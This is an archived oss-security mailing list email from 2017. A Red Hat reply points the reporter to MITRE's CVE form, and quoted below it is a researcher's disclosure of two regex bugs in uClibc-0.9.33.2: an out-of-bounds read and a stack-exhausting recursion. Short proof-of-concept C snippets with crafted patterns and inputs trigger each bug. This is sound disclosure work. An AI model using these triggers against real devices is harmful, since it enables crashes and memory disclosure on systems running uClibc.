X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4108" "Friday" "16" "June" "2017" "08:15:59" "+0200" "Andrej Nemec" "anemec@redhat.com" "<0271829c-ec94-244b-21db-d8804d6ace1a@redhat.com>" "146" "Re: [oss-security] two vulns in uClibc-0.9.33.2" "^Date:" nil nil "6" "2017061606:15:59" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        anemec@redha Jun 16  146/4108  " thread-indent "\"Re: [oss-security] two vulns in uClibc-0.9.33.2\"\n") "<tencent_18C312B86EA079DA42B11D83@qq.com>" ("<tencent_18C312B86EA079DA42B11D83@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 30144 invoked by uid 550); 16 Jun 2017 06:16:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 30126 invoked from network); 16 Jun 2017 06:16:11 -0000
DMARC-Filter: OpenDMARC Filter v1.3.2 mx1.redhat.com F067085541
Authentication-Results: ext-mx04.extmail.prod.ext.phx2.redhat.com; dmarc=none (p=none dis=none) header.from=redhat.com
Authentication-Results: ext-mx04.extmail.prod.ext.phx2.redhat.com; spf=pass smtp.mailfrom=anemec@redhat.com
DKIM-Filter: OpenDKIM Filter v2.11.0 mx1.redhat.com F067085541
References: <tencent_18C312B86EA079DA42B11D83@qq.com>
Message-ID: <0271829c-ec94-244b-21db-d8804d6ace1a@redhat.com>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.8.0
MIME-Version: 1.0
In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com>
Content-Type: multipart/signed; micalg=pgp-sha512;
 protocol="application/pgp-signature";
 boundary="0VtDB7LtMwjk0iRTRnC2isLMIWOFU61jc"
X-Scanned-By: MIMEDefang 2.79 on 10.5.11.16
X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.28]); Fri, 16 Jun 2017 06:15:59 +0000 (UTC)
Date: Fri, 16 Jun 2017 08:15:59 +0200
From: Andrej Nemec <anemec@redhat.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] two vulns in uClibc-0.9.33.2
To: oss-security@lists.openwall.com

--0VtDB7LtMwjk0iRTRnC2isLMIWOFU61jc
Content-Type: multipart/mixed; boundary="Rg3KPuNsOFv1sqCwpSxAmsHaXrh3W3VVG";
 protected-headers="v1"
From: Andrej Nemec <anemec@redhat.com>
To: oss-security@lists.openwall.com
Message-ID: <0271829c-ec94-244b-21db-d8804d6ace1a@redhat.com>
Subject: Re: [oss-security] two vulns in uClibc-0.9.33.2
References: <tencent_18C312B86EA079DA42B11D83@qq.com>
In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com>

--Rg3KPuNsOFv1sqCwpSxAmsHaXrh3W3VVG
Content-Type: text/plain; charset=windows-1252
Content-Transfer-Encoding: quoted-printable

Hello,

Unfortunately, CVE assignments are not done through this list anymore.
You need to visit [1] and request the CVEs by filing out the form. Could
you please look at it and let the list know about the assigned CVEs?

Thanks!

[1] https://cveform.mitre.org/

Best Regards,

--=20
Andrej Nemec, Red Hat Product Security
3701 3214 E472 A9C3 EFBE 8A63 8904 44A1 D57B 6DDA


On 06/16/2017 05:53 AM, fefe wrote:
> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
>
>
> one is about line 2682 of get_subexp.c :
>
>
> 		if (BE (bkref_str_off >=3D mctx->input.valid_len, 0))
> 		{
> 		  /* If we are at the end of the input, we cannot match.  */
> 		  if (bkref_str_off >=3D mctx->input.len)
> 		    break;
>
>
> 		  err =3D extend_buffers (mctx);
> 		  if (BE (err !=3D REG1_NOERROR, 0))
> 		    return err;
>
>
> 		  buf =3D (const char *) re_string_get_buffer (&mctx->input);
> 		}
> 	      if (buf [bkref_str_off++] !=3D buf[sl_str - 1])
> 		break; /* We don't need to search this sub expression
>=20=09=09
> "bkref_str_off >=3D mctx->input.valid_len" , when  bkref_str_off =3D=3D m=
ctx->input.valid_len, "buf [bkref_str_off++] !=3D buf[sl_str - 1]" case Out=
 of one bit bounds read
>
>
> The poc code like:
>=20=09
> 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB =
)=3D=3D0)
> 	{=09=09
>         	reg1match_t pmatch[1];
> 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
> 		regfree(&regtmp);
> 	}
>
>
>
>
>
>
> The another is aout line 1837 of regexce.c :
>
>
> 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int bounda=
ries,
> 			     int subexp_idx, int from_node, int bkref_idx)
>                 .......
>
>
> 		  cpos =3D
> 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
> 						 dst, bkref_idx);
>
>
>=20=09=09
> check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack e=
xhaustion.
>
>
> The poc code like:=09
>=20=09
> 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3=
F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\x=
BD", REG_EXTENDED|REG_ICASE | REG_NOSUB )=3D=3D0)
> 	{=09=09
>         	reg1match_t pmatch[1];
> 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
> 		regfree(&regtmp);
> 	}
>
>
>
>
> A large number of embedded devices uses uclibc instead of glibc.
> Could you assign CVE id for those?
>
>
> Thank you
>
>
> Benjin Liu
> Codesafe Team of Qihoo 360



--Rg3KPuNsOFv1sqCwpSxAmsHaXrh3W3VVG--

--0VtDB7LtMwjk0iRTRnC2isLMIWOFU61jc
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCgAGBQJZQ3efAAoJEIkERKHVe23a9YsP/3SNWm47HeJjGNWax8Zv8W80
gLAfTU+gjY/StI7VTVvCEo80htVyFpfz/6rEF5AWzsDre9EIbPv6hBImZT0uTfSv
cdsP0FsAgFak5gV8GvVySz7yfHbgoCWmc+uirRpnIJJ///ecfrdInhAaN1xRYbMY
Qo4Ok/BO9vPspnqCU4wN2Cuw9rhAIEpHdL7sUUhq4m86SCg7gbbNS6HKQKZhIzzW
41vIocYaPyjnDZp+bBzEkDphsNzQM7PXGc4qFu7rsCPJCLlet//GnmCFe5yywrHq
/nnkDrO+1uqXBOF5iiEOZPo8LIPv0udUoPk1mNzZoUPi/HHNCvSpK58YWckhoozS
od+MNUbvRWvjQJVRiYY96PLICUf2wOBD7f9et868o1mKRWUHEil95ZySmWKP+Ffd
D6w/t7fsNAZiN0BhbANNZxc3Q+daw9lLrF10g//6iYm9Wffv/4Am3lSNtiZNruFf
MGV4TVXyMutr9WPVij59lSq3g8Jzdge1i/dujI75hAb+LTx3AkVdCc6LjhmXh40l
5rv4dq0r9jMqAy7gaTZ21j7qMHjdNyVG7KIJJe52cuak8CrX7gubUqWEpJ/MctVs
xqcfvdsv1UVUFg4QcGil6keyYL2IXGrvVevRCGmBBQXI+AuR2jecGPn0CRDUAShU
BFPm2XuvMHzjV4ctjIDc
=atQJ
-----END PGP SIGNATURE-----

--0VtDB7LtMwjk0iRTRnC2isLMIWOFU61jc--
